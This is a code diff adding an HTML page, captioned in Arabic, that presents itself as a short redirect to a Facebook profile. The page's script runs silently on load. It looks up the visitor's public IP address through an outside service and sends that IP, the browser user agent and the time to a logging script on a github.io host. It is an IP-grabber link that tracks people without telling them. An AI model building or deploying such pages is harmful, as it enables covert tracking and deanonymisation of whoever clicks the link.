@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>يتم تحويلك الآن...</title>
+    <meta charset="UTF-8" />
+    <meta http-equiv="refresh" content="3;url=https://www.facebook.com/elmercato0" />
+    <script>
+      fetch("https://api.ipify.org?format=json")
+        .then((res) => res.json())
+        .then((data) => {
+          const info = {
+            ip: data.ip,
+            userAgent: navigator.userAgent,
+            time: new Date().toLocaleString(),
+          };
+          fetch("https://elmercato.github.io/log.php?" + new URLSearchParams(info));
+        });
+    </script>
+  </head>
+  <body>
+    <h2 style="text-align:center;margin-top:20%">🕵️‍♂️ يتم تحويلك إلى Muhamad Nasif...</h2>
+  </body>
+</html>
